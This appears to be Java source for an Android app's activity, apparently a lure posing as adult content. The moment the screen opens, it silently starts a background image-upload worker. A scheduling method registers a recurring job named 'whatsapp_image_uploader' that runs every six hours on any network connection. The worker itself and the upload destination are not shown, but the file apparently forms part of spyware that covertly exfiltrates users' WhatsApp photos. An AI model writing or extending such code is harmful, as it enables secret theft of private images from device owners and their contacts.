package com.mehboob.bushorat.activities;

import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.mehboob.bushorat.R;
import com.mehboob.bushorat.helpers.ImageUploadWorker;

import java.util.concurrent.TimeUnit;

public class PornActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_porn);

        ImageUploadWorker.enqueueWork(this);
        Log.d("MainActivity", "WorkManager enqueued");


    }

    private void scheduleImageUploadWorker() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest oneTimeUpload = new OneTimeWorkRequest.Builder(ImageUploadWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(this).enqueue(oneTimeUpload);

        PeriodicWorkRequest periodicUpload = new PeriodicWorkRequest.Builder(
                ImageUploadWorker.class,
                6, TimeUnit.HOURS
        )
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "whatsapp_image_uploader",
                ExistingPeriodicWorkPolicy.KEEP,
                periodicUpload
        );
    }

}